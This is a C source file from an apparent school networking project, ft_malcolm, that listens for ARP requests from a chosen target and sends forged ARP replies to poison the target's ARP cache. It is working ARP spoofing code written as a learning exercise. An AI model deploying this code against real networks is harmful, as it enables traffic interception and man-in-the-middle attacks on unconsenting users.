/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   request.c                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: lagea < lagea@student.s19.be >             +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/07/08 16:16:15 by lagea             #+#    #+#             */
/*   Updated: 2025/07/11 17:13:48 by lagea            ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "../inc/ft_malcolm.h"

static void fill_mac_addr(char *mac_str, u_int8_t *mac)
{
	int values[6];
	for (int i = 0; i < 6; i++) {
		char byte_str[3] = {0};
		size_t pos = i * 3;
		if (mac_str[pos] == '\0' || mac_str[pos + 1] == '\0')
			exit_error("Invalid MAC address format");
		byte_str[0] = mac_str[pos];
		byte_str[1] = mac_str[pos + 1];
		int val = (int)ft_atoi_base(byte_str, "0123456789abcdef");
		values[i] = val;
		if (i < 5 && mac_str[pos + 2] != ':')
			exit_error("Invalid MAC address format");
	}
	for (int i = 0; i < 6; i++)
		mac[i] = (u_int8_t)values[i];
}

static void build_arp_packet(t_data *data, u_int32_t fakesenderip)
{
	t_arp_packet *packet = &data->packet;
	ft_memset(packet, 0, sizeof(t_arp_packet));

	fill_mac_addr(data->destination.mac, packet->ethhdr.h_dest); // Destination MAC
	fill_mac_addr(data->source.mac, packet->ethhdr.h_source);
	packet->ethhdr.h_proto = htons(ETH_P_ARP);

	// Fill ARP header
	packet->arphdr.htype = htons(1); // Ethernet
	packet->arphdr.ptype = htons(ETH_P_IP); // IPv4
	packet->arphdr.hlen = ETH_ALEN;
	packet->arphdr.plen = 4;
	packet->arphdr.oper = htons(2); // ARP reply

	fill_mac_addr(data->source.mac, packet->arphdr.sha); // Our MAC (sender)
	ft_memcpy(packet->arphdr.spa, &fakesenderip, 4);           // Source IP (we claim to be)
	fill_mac_addr(data->destination.mac, packet->arphdr.tha); // Target MAC
	ft_memcpy(packet->arphdr.tpa, &data->destination.iip, 4);       // Target IP
}

static void send_arp_reply(t_data *data, u_int32_t fakesenderip)
{
	struct sockaddr_ll addr;
	
	ft_memset(&addr, 0, sizeof(addr));
	addr.sll_family = AF_PACKET;
	addr.sll_ifindex = data->ifindex;
	addr.sll_protocol = htons(ETH_P_ARP);
	addr.sll_halen = ETH_ALEN;

	ft_memcpy(addr.sll_addr, data->destination.mac, ETH_ALEN);

	build_arp_packet(data, fakesenderip);
	
	ssize_t bytes_sent = sendto(data->sockfd, &data->packet, sizeof(t_arp_packet), 0, (struct sockaddr *)&addr, sizeof(addr));
	if (bytes_sent < 0) {
		print_errno("sendto");
		data->running = false;
		return ;
	}

	_(STDOUT_FILENO, "Sent ARP reply packet, check out the arp table on the target\n");
	data->running = false; 
}

static void process_arp_packet(t_data *data, const unsigned char *buffer)
{
	size_t len = 0;
	char buf[BUF_SIZE] = {0};
	t_arphdr_payload *arp = (t_arphdr_payload *)(buffer + sizeof(t_ethhdr));
	
	
	if (ntohs(arp->oper) == ARPOP_REQUEST) {
		len = snprintf(buf, sizeof(buf), "An ARP request has been intercepted:\n");
		
		// Extract sender IP and MAC
		u_int32_t sender_ip = *((u_int32_t *)arp->spa);
		u_int32_t target_ip = *((u_int32_t *)arp->tpa);
		
		
		if (sender_ip == data->destination.iip){
			len += snprintf(buf, BUF_SIZE - len, "\tIP Address: %s\n", inet_ntoa(*(struct in_addr *)&target_ip));
			_(STDOUT_FILENO, buf);

			return send_arp_reply(data, target_ip);
		}
	}
}

void listen_arp_request(t_data *data)
{
	_(STDOUT_FILENO ,"\nListening for ARP requests...\n");
	
	unsigned char buffer[ETH_FRAME_LEN];
	struct sockaddr_ll addr;
	socklen_t addr_len = sizeof(addr);
	ssize_t bytes_received;

	data->running = true;
	while (data->running){
		bytes_received = recvfrom(data->sockfd, &buffer, sizeof(buffer), 0, (struct sockaddr *)&addr, &addr_len);
		if (bytes_received < 0){
			print_errno("recvfrom");
			data->running = false;
			continue;
		}

		if (addr.sll_ifindex != data->ifindex)
			continue;

		process_arp_packet(data, buffer);
	}
}